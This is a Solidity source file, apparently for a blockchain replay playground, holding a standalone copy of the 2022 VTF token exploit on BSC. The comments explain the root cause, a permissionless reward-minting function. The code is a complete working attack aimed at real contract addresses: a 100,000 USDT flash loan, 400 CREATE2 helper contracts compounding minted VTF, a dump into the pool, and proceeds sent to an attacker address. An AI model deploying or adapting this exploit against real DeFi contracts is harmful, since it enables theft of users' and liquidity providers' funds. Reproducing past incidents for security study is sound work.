// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2022-10-VTF).
//
// The DeFiHackLabs PoC (test/VTF_exp.sol) runs the entire attack INLINE in the
// Foundry `ContractTest` test contract (the DPPFlashLoanCall callback, the 400-
// helper CREATE2 factory, and the swap helpers all live on the test itself), so
// there is no standalone contract to deploy. This file is a faithful, self-
// contained copy of that inline attack so the playground can deploy it and record
// run(). Logic and constants are copied verbatim from test/VTF_exp.sol.
//
// Root cause (VTF "Victor the Fortune", BSC, Oct 27 2022): VTF pays a "hold to
// earn" reward of 1%/day that is realized by the PERMISSIONLESS
// updateUserBalance(address _user) — no auth, _user is attacker-chosen — which
// _mint's the accrued amount to _user and resets _user's per-address accrual
// timer. Because the reward accrues on the CURRENT balance and the timer resets
// on realization, an attacker can compound ~2%/day across an unbounded number of
// fresh addresses in one transaction. The exploit pre-deploys 400 helper
// contracts (CREATE2 salts 0..399), each seeded with an accrual timer; after a
// 2-day window each helper mints ~2% of whatever VTF it is handed, then forwards
// the whole grown balance to the next helper. Compounding 2% across ~400 hops
// multiplies the VTF balance ~1.02^400 ≈ 2,800x; dumping that VTF back into the
// VTF/USDT pool drains ~58,419 USDT.
//
// Reproduction note: the recorder uses a SINGLE block.timestamp for the whole
// replay, so the Foundry test's "deploy helpers, THEN vm.warp(+2 days), THEN
// attack" cannot be expressed directly. The helpers' per-address
// userBalanceTime[helper] timers (in VTF storage, mapping slot 32) are patched
// back to the dumped block timestamp via the config's setup.storeSlot steps so
// that run() — executed at the warped (dump + 2 days) timestamp — sees the exact
// 2-day accrual window the original on-chain attack used.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IVTF is IERC20 {
    function updateUserBalance(address _user) external;
}

interface IROUTER {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface DVM {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

// One hop in the compounding chain. Its constructor calls updateUserBalance(self)
// to start its per-address accrual timer (the config later patches that timer back
// to the dumped block timestamp to open the 2-day accrual window). claim()
// realizes ~2% of its held VTF via updateUserBalance(self), then forwards its
// entire (now larger) balance to the next hop.
contract VTFClaimReward {
    IVTF private constant VTF = IVTF(0xc6548caF18e20F88cC437a52B6D388b0D54d830D);

    constructor() {
        VTF.updateUserBalance(address(this));
    }

    function claim(address receiver) external {
        VTF.updateUserBalance(address(this));
        VTF.transfer(receiver, VTF.balanceOf(address(this)));
    }
}

contract VTFDrain {
    address constant ATTACKER = 0x00000000000000000000000000000000DeaDBeef;
    IVTF constant VTF = IVTF(0xc6548caF18e20F88cC437a52B6D388b0D54d830D);
    IERC20 constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IROUTER constant Router = IROUTER(0x7529740ECa172707D8edBCcdD2Cba3d140ACBd85);
    DVM constant dodo = DVM(0x26d0c625e5F5D6de034495fbDe1F6e9377185618);

    address[] public contractList;

    uint256 private constant NUM_HELPERS = 400;
    uint256 private constant FLASH_AMOUNT = 100_000 * 1e18;

    constructor() {
        // Deploy 400 helper contracts via CREATE2 (salts 0..399), mirroring the
        // Foundry test's contractFactory(). Each constructor starts its accrual
        // timer (userBalanceTime[self] = block.timestamp).
        bytes memory bytecode = type(VTFClaimReward).creationCode;
        for (uint256 salt = 0; salt < NUM_HELPERS; salt++) {
            address deployed;
            assembly {
                deployed := create2(0, add(bytecode, 32), mload(bytecode), salt)
            }
            contractList.push(deployed);
        }
    }

    // Recorded entrypoint: flash-loan 100,000 USDT from DODO (zero-fee DVM); the
    // callback below runs the buy → compounding mint chain → sell → repay, then
    // forwards the remaining USDT to the attacker EOA.
    function run() external {
        dodo.flashLoan(0, FLASH_AMOUNT, address(this), new bytes(1));
        USDT.transfer(ATTACKER, USDT.balanceOf(address(this)));
    }

    // DODO DVM flash-loan callback (zero fee). Faithful copy of the test's
    // DPPFlashLoanCall: buy VTF, hand it to helper #0, walk the 400-helper chain
    // (each hops mints ~2% then forwards), sell the inflated VTF back, repay.
    function DPPFlashLoanCall(address, uint256, uint256, bytes calldata) external {
        _usdtToVtf();
        VTF.transfer(contractList[0], VTF.balanceOf(address(this)));
        for (uint256 i = 0; i < contractList.length - 1; i++) {
            (bool ok,) = contractList[i].call(abi.encodeWithSignature("claim(address)", contractList[i + 1]));
            require(ok);
        }
        uint256 last = contractList.length - 1;
        (bool okLast,) = contractList[last].call(abi.encodeWithSignature("claim(address)", address(this)));
        require(okLast);
        _vtfToUsdt();
        USDT.transfer(address(dodo), FLASH_AMOUNT);
    }

    function _usdtToVtf() internal {
        USDT.approve(address(Router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(USDT);
        path[1] = address(VTF);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            FLASH_AMOUNT, 0, path, address(this), block.timestamp
        );
    }

    function _vtfToUsdt() internal {
        VTF.approve(address(Router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(VTF);
        path[1] = address(USDT);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            VTF.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }
}
